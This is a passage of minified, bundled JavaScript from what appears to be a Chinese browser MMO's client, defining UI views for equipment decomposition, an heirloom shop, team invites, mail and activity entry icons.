v={type:u[d].type,id:u[d].id,count:u[d].count*p};s.push(v)}}}s.length>0?this.propList.dataProvider=new eui.ArrayCollection(s):(this.propList.dataProvider=new eui.ArrayCollection(this.defaultAward),this.updateAwardList()),this.txt_cost.text=this.costCoin+"/"+l.ActorCC.gold,this.coinGrop.visible=this.costCoin>0},e.prototype.onItemClick=function(t){if(!this.isNull){if(t){var e=t.itemRenderer;e&&(e.isSelect?e.setSelect(!1):e.setSelect(!0))}this.setAwardList()}},e.prototype.onClick=function(t){switch(t.target){case this.eBtn:this.clearAllSelect();for(var e=0;e<this.propList0.numElements;e++){var i=this.propList0.getElementAt(e);i&&p.Heirloom.ins().checkIsDescom(i.data.configID)&&i.setSelect(!0)}this.setAwardList();break;case this.eBtn0:if(this.decomposeItemArr.length<=0)return void u.TipsCT.ins().showTips(gettext("没有可分解装备"));if(!n.GlobalFun.checkCost(this.costCoin,1,"",!0))return;if(h.BagCT.ins().getAllSurplusCount(1)<0)return void u.TipsCT.ins().showTips(gettext("背包剩余空间不足，请扩容"));h.BagCT.ins().sendMergeMost(this.decomposeItemArr,0),win.close(this)}},e.prototype.clearAllSelect=function(){this.decomposeItemArr=[],this.costCoin=0;for(var t=0;t<this.propList0.numElements;t++){var e=this.propList0.getElementAt(t);e&&e.setSelect(!1)}},e.prototype.updateAwardList=function(){for(var t=0;t<this.propList.numElements;t++){var e=this.propList.getElementAt(t);e&&0==e.data.count&&e.setCount("0")}},__decorate([delayCall(100)],e.prototype,"updateAwardList",null),e}(s.BaseView);e.HeirloomDecom=d,window.HeirloomDecom=d,__reflect(d.prototype,"HeirloomDecom",[]),window.HeirloomDecom=d;var c=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e.isSelect=!1,e}return __extends(e,t),e.prototype.skinComplete=function(){this.select2.visible=this.select.visible=!1,this.gift.enabled=!1},e.prototype.dataChanged=function(){this.data?this.gift.data=this.data:this.select.visible=this.select2.visible=!1},e.prototype.setSelect=function(t){this.isSelect=t,this.select2.visible=this.isSelect},e}(o.BaseItemRender);e.HeirloomSelectItemRender=c,window.HeirloomSelectItemRender=c,__reflect(c.prototype,"HeirloomSelectItemRender",[])},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.HeirloomShopItem=e.HeirloomShop=void 0;var n=i(19),o=i(3),s=i(1),a=i(0),r=i(6),l=i(2),h=i(149),u=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return __extends(e,t),e.prototype.skinComplete=function(){this.list.itemRenderer=p,this.list.dataProvider=new eui.ArrayCollection([])},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];observe(this,this.updateCost,r.BagCT.ins().postItemChange);var i=[],n=a.GlobalConfig.HeirloomEquipItemConfig;for(var o in n)n[o].show&&i.push(n[o]);this.list.dataProvider=new eui.ArrayCollection(i)},e.prototype.updateCost=function(){for(var t=0;t<this.list.numElements;t++){var e=this.list.getElementAt(t);e&&e.updateCost()}},e}(s.BaseView);e.HeirloomShop=u,window.HeirloomShop=u,__reflect(u.prototype,"HeirloomShop",[]),window.HeirloomShop=u;var p=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return __extends(e,t),e.prototype.createChildren=function(){this.addTouchEvent(this.goBtn,this.onClick)},e.prototype.dataChanged=function(){this.item.data=this.data.item,this.updateCost()},e.prototype.updateCost=function(){this.costCm.setData(this.data.expend,!1)},e.prototype.onClick=function(){var t=this.data.expend;if(n.GlobalFun.checkCost(t.count,t.id))return r.BagCT.ins().getAllSurplusCount(1)<0?void l.TipsCT.ins().showTips(gettext("背包剩余空间不足，请扩容")):void h.Heirloom.ins().sendHeirloomAdd(this.data.pos)},e}(o.BaseItemRender);e.HeirloomShopItem=p,window.HeirloomShopItem=p,__reflect(p.prototype,"HeirloomShopItem",[]),window.HeirloomShopItem=p},function(t,e){},function(t,e){},function(t,e){},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.InvadeRankRoleItemRender=void 0;var n=i(3),o=i(0),s=i(10),a=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return __extends(e,t),e.prototype.skinComplete=function(){this.touchEnabled=!1},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.dataChanged()},e.prototype.dataChanged=function(){if(this.btnRemove.visible=!1,this._info=this.data,this._info||(this.rolegroup.visible=!1),this.data&&this.skin&&(this.lab.visible=!1,this.rolegroup.visible=!0,this.nomember.visible=this.invite.visible=!1,this.position.visible=!0,this.position.visible=!1,this.eNameLab.text=this._info.player,this.ePow.text=this._info.score+"",this.lb_lv.text=this._info.level+"",this.eIcon.source="yuanhead"+this._info.job+1,this.eTitleGrp.visible=!!this._info.title,this.eTitleGrp.visible)){var t=o.GlobalConfig.TitleConf[this._info.title];this.eTitle.text=null===t||void 0===t?void 0:t.name,this.eTitle.textColor=s.ItemUtil.getQualityColor((null===t||void 0===t?void 0:t.rare)||0),this.updateTitleEff(t)}},e.prototype.updateTitleEff=function(t){return t.eff?(this.titleMc||(this.titleMc=ObjectPool.pop("MovieClip"),this.effTopGrp.addChild(this.titleMc)),this.eTitle.visible=!1,this.effTopGrp.visible=!0,void this.titleMc.playFile(RES_DIR_EFF+t.eff,-1)):(this.titleMc&&this.effTopGrp.removeChild(this.titleMc),this.titleMc=null,this.effTopGrp.visible=!1,void(this.eTitle.visible=!0))},e}(n.BaseItemRender);e.InvadeRankRoleItemRender=a,window.InvadeRankRoleItemRender=a,__reflect(a.prototype,"InvadeRankRoleItemRender",[]),window.InvadeRankRoleItemRender=a},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.InvadeTeamRoleItemRender=void 0;var n=i(3),o=i(2),s=i(0),a=i(10),r=i(4),l=i(44),h=i(82),u=i(1673),p=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._bolHideInvite=!1,e}return __extends(e,t),e.prototype.skinComplete=function(){this.touchEnabled=!1,this.addTouchEvent(this,this.onTouch)},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.dataChanged()},e.prototype.onTouch=function(t){switch(t.target){case this.invite:case this.nomember:if(h.InvadeCT.ins().invadeTeamDatas.length){var e=gettext("我开启了荒漠入侵队伍，赶紧加入一起战斗吧！");win.open(u.InvadeInviteWin,e)}break;case this.rolegroup:this._info&&this._info.id!=r.ActorCC.actorID&&l.ReadPlayerCT.ins().sendFindPlayer(this._info.id);break;case this.btnRemove:if(h.InvadeCT.ins().invadeTeamBaseId)return void o.TipsCT.ins().showTips(gettext("已经报名无法移出队伍"));h.InvadeCT.ins().sendOutTeam(this._info.id)}},e.prototype.dataChanged=function(){var t;if(this.btnRemove.visible=!1,this.skin){if(this._info=this.data,!this._info)return this.nomember.visible=!0,this.invite.visible=!0,this.position.visible=!1,this.lab.visible=!!h.InvadeCT.ins().invadeTeamDatas.length,this.rolegroup.visible=!1,void this.updateHideInvite();if(this.lab.visible=!1,this.rolegroup.visible=!0,this.nomember.visible=this.invite.visible=!1,this.position.visible=!0,this.position.source=1==this._info.isLeader?"road_leader":"road_assistant",this.eIcon.source="yuanhead"+this._info.job+1,this.eNameLab.text=this._info.name,this.ePow.text=this._info.power+"",this.lb_lv.text=this._info.level+"",this.eTitleGrp.visible=!!this._info.title,this.eTitleGrp.visible){var e=s.GlobalConfig.TitleConf[this._info.title];this.eTitle.text=null===e||void 0===e?void 0:e.name,this.eTitle.textColor=a.ItemUtil.getQualityColor((null===e||void 0===e?void 0:e.rare)||0),this.updateTitleEff(e)}this._info.outward?this.bgkuang.source=(null===(t=s.GlobalConfig.TitleConf[this._info.outward])||void 0===t?void 0:t.img)+"_png":this.bgkuang.source="entity_bg",this.btnRemove.visible=h.InvadeCT.ins().checkIsTeamer(this._info.id)&&h.InvadeCT.ins().checkMeIsLeader()&&this._info.id!=r.ActorCC.actorID,this.updateHideInvite()}},e.prototype.updateTitleEff=function(t){return t.eff?(this.titleMc||(this.titleMc=ObjectPool.pop("MovieClip"),this.effTopGrp.addChild(this.titleMc)),this.eTitle.visible=!1,this.effTopGrp.visible=!0,void this.titleMc.playFile(RES_DIR_EFF+t.eff,-1)):(this.titleMc&&this.effTopGrp.removeChild(this.titleMc),this.titleMc=null,this.effTopGrp.visible=!1,void(this.eTitle.visible=!0))},e.prototype.setHideInvide=function(t){this._bolHideInvite=t,this.updateHideInvite()},e.prototype.updateHideInvite=function(){this.skin&&this._bolHideInvite&&(this.nomember.touchEnabled=!1,this.invite.visible=this.lab.visible=!1)},e}(n.BaseItemRender);e.InvadeTeamRoleItemRender=p,window.InvadeTeamRoleItemRender=p,__reflect(p.prototype,"InvadeTeamRoleItemRender",[]),window.InvadeTeamRoleItemRender=p},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.InvadeInviteWin=void 0;var n=i(1),o=i(7),s=i(2),a=i(82),r=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="teamFbInviteSkin",e._deDes="",e}return __extends(e,t),e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this._deDes=t[0],this.input.text=this._deDes,this.input.maxChars=40,this.addTouchEvent(this,this.onTouch)},e.prototype.onTouch=function(t){switch(t.target){case this.worldInviteBtn:var e=a.InvadeCT.ins().checkMeIsLeader();if(!e)return void s.TipsCT.ins().showTips(gettext("队长才能邀请玩家"));if(a.InvadeCT.ins().invadeTeamBaseId)return void s.TipsCT.ins().showTips(gettext("报名成功后无法邀请"));if(!a.InvadeCT.ins().checkCanInvite()){var i=Math.ceil(.001*(a.InvadeCT.ins().nextCanInviteTime-o.GameServerCC.serverTime));return void s.TipsCT.ins().showTips(gettext("{0}秒后才能世界邀请",i))}a.InvadeCT.ins().sendInvite(),win.close(this)}},e}(n.BaseView);e.InvadeInviteWin=r,window.InvadeInviteWin=r,__reflect(r.prototype,"InvadeInviteWin",[]),window.InvadeInviteWin=r},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.LingJingRoleItemRender=void 0;var n=i(3),o=i(0),s=i(10),a=i(8),r=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return __extends(e,t),e.prototype.skinComplete=function(){this.touchEnabled=!1},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.dataChanged()},e.prototype.dataChanged=function(){var t;if(this.btnRemove.visible=!1,this._info=this.data,this._info||(this.rolegroup.visible=!1),this.data&&this.skin){this.lab.visible=!1,this.rolegroup.visible=!0,this.nomember.visible=this.invite.visible=!1,this.position.visible=!0,this.position.visible=!1,this.eNameLab.text=this._info.player,this._info.frame?this.bgkuang.source=(null===(t=o.GlobalConfig.TitleConf[this._info.frame])||void 0===t?void 0:t.img)+"_png":this.bgkuang.source="entity_bg";var e=a.DateUtils.getFormatBySecond(this._info.times,a.DateUtils.TIME_FORMAT_1);if(e=e.slice(0,-3).replace(/:/g,"："),this.ePow.text=e,this.lb_lv.text=this._info.level+"",this.eIcon.source="yuanhead"+this._info.job+1,this.eTitleGrp.visible=!!this._info.title,this.eTitleGrp.visible){var i=o.GlobalConfig.TitleConf[this._info.title];this.eTitle.text=null===i||void 0===i?void 0:i.name,this.eTitle.textColor=s.ItemUtil.getQualityColor((null===i||void 0===i?void 0:i.rare)||0),this.updateTitleEff(i)}}},e.prototype.updateTitleEff=function(t){return t.eff?(this.titleMc||(this.titleMc=ObjectPool.pop("MovieClip"),this.effTopGrp.addChild(this.titleMc)),this.eTitle.visible=!1,this.effTopGrp.visible=!0,void this.titleMc.playFile(RES_DIR_EFF+t.eff,-1)):(this.titleMc&&this.effTopGrp.removeChild(this.titleMc),this.titleMc=null,this.effTopGrp.visible=!1,void(this.eTitle.visible=!0))},e}(n.BaseItemRender);e.LingJingRoleItemRender=r,window.LingJingRoleItemRender=r,__reflect(r.prototype,"LingJingRoleItemRender",[]),window.LingJingRoleItemRender=r},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.LongGasBreakItem=void 0;var n=i(18),o=i(5),s=i(3),a=i(0),r=function(t){function e(){var e=t.call(this)||this;return e._sn_="LongGasBreakItemSkin",e}return __extends(e,t),e.prototype.childrenCreated=function(){t.prototype.childrenCreated.call(this)},e.prototype.dataChanged=function(){var t;if(this.data){var e,i=this.data.sum,s=this.data.costNum,r=this.data.costItem;e=i>=s?n.ColorUtil.GREEN:n.ColorUtil.RED,this.lv.textFlow=o.TextFlowMaker.generateTextFlow1("|C:"+e+"&T:"+i+"/"+s);var l=a.GlobalConfig.ItemConfig[r];this.nameTxt.text=l.name,null===(t=this.itemIcon)||void 0===t?void 0:t.setIcon(l.icon+"")}},e.prototype.destruct=function(){},e.prototype.clear=function(){},e}(s.BaseItemRender);e.LongGasBreakItem=r,window.LongGasBreakItem=r,__reflect(r.prototype,"LongGasBreakItem",[]),window.LongGasBreakItem=r},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.LongGasItem=void 0;var n=i(49),o=i(3),s=i(0),a=i(133),r=i(440),l=i(444),h=function(t){function e(){var e=t.call(this)||this;return e._sn_="LongGasItemSkin",e.isSkill=!1,e}return __extends(e,t),e.prototype.childrenCreated=function(){t.prototype.childrenCreated.call(this),this.slot=0},e.prototype.skinComplete=function(){this.black.visible=!1,this.redPoint.visible=!1,this.addEventListener(egret.TouchEvent.TOUCH_TAP,this.onClick,this)},e.prototype.dataChanged=function(){if(this.isSkill){var t=a.LongGasCT.ins().openSelectID,e=a.LongGasCT.ins().returnLongGasUnlockDataByID(t),i=void 0;i=e?s.GlobalConfig.LoongGasSuitCfg[t][e.lv].skillid:s.GlobalConfig.LoongGasSuitCfg[t][1].skillid;var o=s.GlobalConfig.SkillsConfig[i];if(o){this.item.setIcon(1e3*Math.floor(o.id/1e3)+"_png"),this.nameTxt.text=s.GlobalConfig.SkillsDescConfig[o.desc].name;var r=a.LongGasCT.ins().returnLongGasUnlockDataByID(a.LongGasCT.ins().openSelectID),l=0;if(r){var h=s.GlobalConfig.LoongGasSuitCfg[a.LongGasCT.ins().openSelectID][r.lv];l=h.lv}this.lv.text="lv."+l}}else if(this.data){var u=s.GlobalConfig.LoongGasPosCfg[this.data][0];if(u){this.nameTxt.text=u.name,this.item.setIcon(u.icon+"");var l=a.LongGasCT.ins().getSiteLvByID(this.data);this.lv.text=l+"",0==l?(this.mianG.filters=n.FilterUtil.ARRAY_GRAY_FILTER,this.redPoint.visible=!1):this.mianG.filters=n.FilterUtil.normalColor,this.redPoint.visible=a.LongGasCT.ins().returnByLongGasSiteRed(this.data)}}},e.prototype.destruct=function(){},e.prototype.clear=function(){},e.prototype.onClick=function(){if(this.isSkill){var t=a.LongGasCT.ins().openSelectID,e=a.LongGasCT.ins().returnLongGasUnlockDataByID(t),i=void 0;i=e?s.GlobalConfig.LoongGasSuitCfg[t][e.lv]:s.GlobalConfig.LoongGasSuitCfg[t][1];var n=s.GlobalConfig.SkillsConfig[i.skillid],o=null==e?!1:!0,h={type:6,cfg:n,isActive:o,lv:i.lv||0};return void win.open(l.LongGasSkillTipWin,h)}var u=a.LongGasCT.ins().getSlotByInfo(this.data),p=0;u||(p=2),u&&u.assault&&(p=1),u&&!u.assault&&(p=3),0!=p&&win.open(r.LongGasBreakPanel,p,0,this.data)},e.prototype.isSetSkill=function(){this.isSkill=!0},e}(o.BaseItemRender);e.LongGasItem=h,window.LongGasItem=h,__reflect(h.prototype,"LongGasItem",[]),window.LongGasItem=h},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.LongGasItemIcon=void 0;var n=i(3),o=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="LongGasItemIconSkin",e.isSkin=!1,e.icon="",e}return __extends(e,t),e.prototype.skinComplete=function(){this.isSkin&&(this.isSkin=!1,this.setIcon(this.icon))},e.prototype.dataChanged=function(){},e.prototype.setIcon=function(t){return this.skin?void(this.imgIcon.source=t):(this.isSkin=!0,void(this.icon=t))},e}(n.BaseItemRender);e.LongGasItemIcon=o,window.LongGasItemIcon=o,__reflect(o.prototype,"LongGasItemIcon",[]),window.LongGasItemIcon=o},function(t,e){},function(t,e){},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.BtnTwinkle=void 0;var n=i(16),o=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return __extends(e,t),e.prototype.showTwinkle=function(t,e,i){void 0===e&&(e=0),void 0===i&&(i=0),this.mc||(this.mc=ObjectPool.pop("MovieClip")),this.getChildIndex(this.mc)<0&&this.addChild(this.mc),this.mc.x=e,this.mc.y=i,this.mc.playFile(RES_DIR_EFF+t,-1)},e.prototype.hideTwinkle=function(){this.iconDisplay&&(this.iconDisplay.alpha=1),this.mc&&this.getChildIndex(this.mc)>=0&&n.DisplayUtils.removeFromParent(this.mc)},e}(eui.Button);e.BtnTwinkle=o,window.BtnTwinkle=o,__reflect(o.prototype,"BtnTwinkle",[]),window.BtnTwinkle=o},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.MailPanel=void 0;var n=i(1),o=i(196),s=i(599),a=i(2),r=i(8),l=i(11),h=i(5),u=i(0),p=i(10),d=i(445),c=i(6),f=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="MailSkin",e._mails=[],e.curUid=0,e.curNum=0,e.rewardList=[],e}return __extends(e,t),e.prototype.skinComplete=function(){this.addTouchEvent(this,this.onClick),this.eItem.itemRenderer=l.ItemBase,this.eL.itemRenderer=s.MailItem,this.eL.dataProvider=this.mailList=new eui.ArrayCollection;var t=o.MailCT.ins().getMailByRead();if(t){var e=t[1];this.choose=e.handle,o.MailCT.ins().sendMailContentData(this.choose)}},e.prototype.addDisplay=function(){observe(this,this.setOpenMail,o.MailCT.ins().postMailDetail,o.MailCT.ins().postGetItemFromMail),observe(this,this.setMailData,o.MailCT.ins().postMailData,o.MailCT.ins().postMailDetail),this.setMailData()},e.prototype.removeDisplay=function(){},e.prototype.setOpenMail=function(t){if(t){this.rewardList=[],this.getReadLen(),this.eG.visible=!0,this.curUid=t.handle,this.eTime.text=r.DateUtils.getFormatBySecond(t.times,2),this.eDesc.textFlow=h.TextFlowMaker.generateTextFlow1(t.text),this.ePS.visible=this.eGetBtn0.visible=t.receive>-1,this.eGetBtn0.visible=t.receive>-1;var e="";e=t.receive?gettext("已提取"):gettext("提取"),this.eGetBtn0.label=e,this.eGetBtn0.enabled=!t.receive;var i=t.item;if(!i)return void(this.eItem.dataProvider=null);for(var n=[],o=[],s=[],a=[],l=0;l<i.length;l++){var d=u.GlobalConfig.ItemConfig[i[l].id];if(1!=p.ItemUtil.getType(d))0==i[l].type?n.push(i[l]):s.push(i[l]);else if(o.length){for(var c=!1,f=0;f<o.length;f++)if(o[f].id==i[l].id){o[f].count+=i[l].count,c=!0;break}c||o.push(i[l])}else o.push(i[l])}s.sort(this.RuleSortByItem),this.rewardList=a.concat(n,o,s),this.eItem.dataProvider=new eui.ArrayCollection(this.rewardList)}},e.prototype.RuleSortByItem=function(t,e){var i=u.GlobalConfig.ItemConfig[t.id],n=u.GlobalConfig.ItemConfig[e.id],o=p.ItemUtil.getQuality2(i),s=p.ItemUtil.getQuality2(n);return o>s?-1:s>o?1:0},e.prototype.getReadLen=function(){for(var t=0,e=0;e<this._mails.length;e++)0==this._mails[e].type&&t++;this.eNum.text="["+t+"/"+this._mails.length+"]"},e.prototype.setMailData=function(){this._mails=o.MailCT.ins().mailData;var t=o.MailCT.ins().getMailDataByHandle(this.choose);this._mails.length?t?this.mailList.replaceAll(this._mails):(this.choose=this._mails[0].handle,o.MailCT.ins().sendMailContentData(this.choose),this.eG.visible=this.eGetBtn0.visible=!1):(this.eG.visible=this.eGetBtn0.visible=!1,this.mailList.source=null),this.getReadLen(),this.curNum=t&&t[1]?+t[0]:this.curNum,this.eL.selectedIndex=this.curNum},e.prototype.onClick=function(t){if(t.target instanceof s.MailItem&&t.target.data&&this.choose!=t.target.data.handle)return this.choose=t.target.data.handle,this.curNum=t.target.itemIndex,void o.MailCT.ins().sendMailContentData(this.choose);switch(t.target){case this.eGetBtn:if(!this._mails.length)return;var e=o.MailCT.ins().getMailByReceive();if(!e.length){var i=o.MailCT.ins().getMailByReceiveAndRead();if(!i.length)return void a.TipsCT.ins().showTips(gettext("已提取"));for(var n=[],r=0;r<i.length;r++)n.push(i[r].handle);return void o.MailCT.ins().sendGetItem(n)}for(var l=[],r=0;r<e.length;r++)l.push(e[r].handle);o.MailCT.ins().sendGetItem(l);break;case this.eDelBtn:if(!this._mails.length)return;send(Ts.delMail,{uid:-1});break;case this.eGetBtn0:var h=c.BagCT.ins().rockonNeedNum(this.rewardList);if(h&&c.BagCT.ins().getAllSurplusCount(h)<0)return void a.TipsCT.ins().showTips(gettext("背包已满"));var u=[];u.push(this.curUid),o.MailCT.ins().sendGetItem(u)}},e.prototype.tabRp=function(){return!!d.MailRedPoint.ins().redPoint},__decorate([delayCall(100)],e.prototype,"setMailData",null),e}(n.BaseView);e.MailPanel=f,window.MailPanel=f,__reflect(f.prototype,"MailPanel",[]),window.MailPanel=f},function(t,e){var i;!function(t){t[t.top=1]="top",t[t.left=2]="left",t[t.right=3]="right"}(i||(i={})),window.PayfunPost=i},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.BurningDesertTeamRule=void 0;var n=i(0),o=i(75),s=i(190),a=i(268),r=i(41),l=function(t){function e(e){var i=t.call(this,e)||this;return i.cfg=e,i.showMsg([o.BurningDesertCT.ins().roomMemberInfoBack,o.BurningDesertCT.ins().exitRoomBack,o.BurningDesertCT.ins().postRoomChange,Ts.enterScene.enterOK]),i}return __extends(e,t),e.prototype.checkShow=function(){this.descType=gettext("组队中");var t=o.BurningDesertCT.ins().checkShowEnter();return t},e.prototype.tapEvt=function(){if(o.BurningDesertCT.ins().checkMeIsLeader()){var t=n.GlobalConfig.HotDesertFbConfig[o.HotDesertFbEnum.ShiKongZhiJing];win.open(a.ShiKongZhiJingFbView,0,1,t)}else win.open(s.BurningDesertRoomView)},e}(r.PayfunIconData);e.BurningDesertTeamRule=l,window.BurningDesertTeamRule=l,__reflect(l.prototype,"BurningDesertTeamRule",[]),window.BurningDesertTeamRule=l},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ContestRule=void 0;var n=i(17),o=i(15),s=i(20),a=i(74),r=i(261),l=i(487),h=i(12),u=i(41),p=function(t){function e(e){var i=t.call(this,e)||this;return i.cfg=e,i.showMsg([n.RedPointBaseSys.ins().RpChange,r.ContestRedPoint.ins().postRedPoint,a.ContestCT.ins().postContestStatus,Ts.enterScene.enterOK]),i}return __extends(e,t),e.prototype.checkShow=function(){this.redPoint=this.actRp();var t=h.OpenSystem.ins().checkSysOpen(o.SystemType.Contest)&&a.ContestCT.ins().stageType>0;return t},e.prototype.tapEvt=function(){s.GameMap.checkIsKf()||win.open(l.ContestMainWin)},e.prototype.actRp=function(){return r.ContestRedPoint.ins().redPoint},e}(u.PayfunIconData);e.ContestRule=p,window.ContestRule=p,__reflect(p.prototype,"ContestRule",[]),window.ContestRule=p},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.DevilRule=void 0;var n=i(20),o=i(125),s=i(64),a=i(41),r=function(t){function e(e){var i=t.call(this,e)||this;return i.cfg=e,i.showMsg([s.MainUICC.postDevilEnterChange,o.DevildomSys.ins().postBossInfo,Ts.enterScene.enterOK]),i}return __extends(e,t),e.prototype.checkShow=function(){var t=s.MainUICC.devilEnterShow();return 0==t?!1:(this.descType=gettext("进行中"),!0)},e.prototype.tapEvt=function(){n.GameMap.checkIsKf()||win.open("DevilInvadeWin")},e}(a.PayfunIconData);e.DevilRule=r,window.DevilRule=r,__reflect(r.prototype,"DevilRule",[]),window.DevilRule=r},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.FaceBookRule=void 0;var n=i(15),o=i(401),s=i(12),a=i(41),r=function(t){function e(e){var i=t.call(this,e)||this;return i.cfg=e,i}return __extends(e,t),e.prototype.checkShow=function(){return!window.platform.isshen()&&s.OpenSystem.ins().checkSysOpen(n.SystemType.FaceBook)},e.prototype.tapEvt=function(){win.open(o.FacebookWindow)},e}(a.PayfunIconData);e.FaceBookRule=r,window.FaceBookRule=r,__reflect(r.prototype,"FaceBookRule",[]),window.FaceBookRule=r},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.GameFlashSaleRule=void 0;var n=i(59),o=i(294),s=i(7),a=i(41),r=function(t){function e(e){var i=t.call(this,e)||this;return i.cfg=e,i.showMsg([n.GameFlashSaleCt.ins().postGiftInfoChange,Ts.enterScene.enterOK]),i}return __extends(e,t),e.prototype.setTimeShow=function(){this._endTime=n.GameFlashSaleCt.ins().getMinEndTime(),this._endTime>s.GameServerCC.serverTime&&(this.descType=this._endTime)},e.prototype.timeHandler=function(){this._endTime>s.GameServerCC.serverTime&&(this.descType=this._endTime)},e.prototype.checkShow=function(){var t=n.GameFlashSaleCt.ins().checkEnterOpen();return t&&this.setTimeShow(),!window.platform.isshen()&&n.GameFlashSaleCt.ins().checkEnterOpen()},e.prototype.tapEvt=function(){win.open(o.GameFlashSaleWin,!1)},e}(a.PayfunIconData);e.GameFlashSaleRule=r,window.GameFlashSaleRule=r,__reflect(r.prototype,"GameFlashSaleRule",[]),window.GameFlashSaleRule=r},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.GuildBattleRule=void 0;var n=i(15),o=i(28),s=i(51),a=i(12),r=i(2),l=i(41),h=function(t){function e(e){var i=t.call(this,e)||this;return i.cfg=e,i.showMsg([s.GuildBattleCT.ins().postGuildWarStarInfo,s.GuildBattleCT.ins().guildBattleEnd,Ts.enterScene.enterOK]),i}return __extends(e,t),e.prototype.checkShow=function(){this.descType=s.GuildBattleCT.ins().getModel().actEndTime;var t=s.GuildBattleCT.ins().getModel().checkShowEnter();return t},e.prototype.tapEvt=function(){return a.OpenSystem.ins().checkSysOpen(n.SystemType.GuildBattle)?o.Guild.ins().guildID<=0?void r.TipsCT.ins().showTips(gettext("需先加入行会")):void s.GuildBattleCT.ins().reqJoinAc():void r.TipsCT.ins().showTips(a.OpenSystem.ins().getNoOpenTips(n.SystemType.GuildBattle))},e}(l.PayfunIconData);e.GuildBattleRule=h,window.GuildBattleRule=h,__reflect(h.prototype,"GuildBattleRule",[]),window.GuildBattleRule=h},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.InvadeRule=void 0;var n=i(82),o=i(258),s=i(102),a=i(41),r=function(t){function e(e){var i=t.call(this,e)||this;return i.cfg=e,i.showMsg([n.InvadeCT.ins().postInvadeActInfo,n.InvadeCT.ins().postInvadeInfoUpdate,Ts.enterScene.enterOK]),i
}return __extends(e,t),e.prototype.checkShow=function(){var t=n.InvadeCT.ins().checkShowEnter()&&!s.KFServerSys.ins().isKF;return t},e.prototype.tapEvt=function(){win.open(o.InvadeWin)},e}(a.PayfunIconData);e.InvadeRule=r,window.InvadeRule=r,__reflect(r.prototype,"InvadeRule",[]),window.InvadeRule=r},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.KfAnena3v3Rule=void 0;var n=i(15),o=i(12),s=i(160),a=i(47),r=i(2),l=i(41),h=function(t){function e(e){var i=t.call(this,e)||this;return i.cfg=e,i.showMsg([a.KfArenaSys.ins().postKfArenaEnd,Ts.enterScene.enterOK,a.KfArenaSys.ins().postOpenKfArena]),i}return __extends(e,t),e.prototype.checkShow=function(){var t=a.KfArenaSys.ins().checkShowEnter();return 0==t?!1:(1==t?(this.descType=a.KfArenaSys.ins().actEndTime,this.descStyle=gettext("{0}后开启")):(this.descType=a.KfArenaSys.ins().actEndTime,this.descStyle=""),!0)},e.prototype.tapEvt=function(){return o.OpenSystem.ins().checkSysOpen(n.SystemType.KF3v3)?void win.open(s.PlayWayWin,s.PlayWayPage.KfArena3v3):void r.TipsCT.ins().showTips(o.OpenSystem.ins().getNoOpenTips(n.SystemType.KF3v3))},e}(l.PayfunIconData);e.KfAnena3v3Rule=h,window.KfAnena3v3Rule=h,__reflect(h.prototype,"KfAnena3v3Rule",[]),window.KfAnena3v3Rule=h},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.MoreGameRule=void 0;var n=i(15),o=i(20),s=i(479),a=i(12),r=i(41),l=function(t){function e(e){var i=t.call(this,e)||this;return i.cfg=e,i.showMsg([o.GameMap.postFbType]),i}return __extends(e,t),e.prototype.tapEvt=function(){s.MoreGameView.open(urlParam.moregamedatas)},e.prototype.checkShow=function(){return a.OpenSystem.ins().checkSysOpen(n.SystemType.MOREGAME)},e}(r.PayfunIconData);e.MoreGameRule=l,window.MoreGameRule=l,__reflect(l.prototype,"MoreGameRule",[]),window.MoreGameRule=l},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.OSATarget38Rule=void 0;var n=i(8),o=i(9),s=i(252),a=i(41),r=function(t){function e(e){var i=t.call(this,e)||this;return i.cfg=e,i.actID=0,i.showMsg([o.Activity.ins().postHongBaoOpen,o.Activity.ins().postChangePage,o.Activity.ins().postDownHongBao]),i}return __extends(e,t),e.prototype.tapEvt=function(){win.open(s.FuliWin,"FuliActivityMain","OSATarget38Panel")},e.prototype.checkShow=function(){this.actID=0;for(var t in o.Activity.ins().activityData)38==o.Activity.ins().activityData[t].type&&(this.actID=o.Activity.ins().activityData[t].id);return 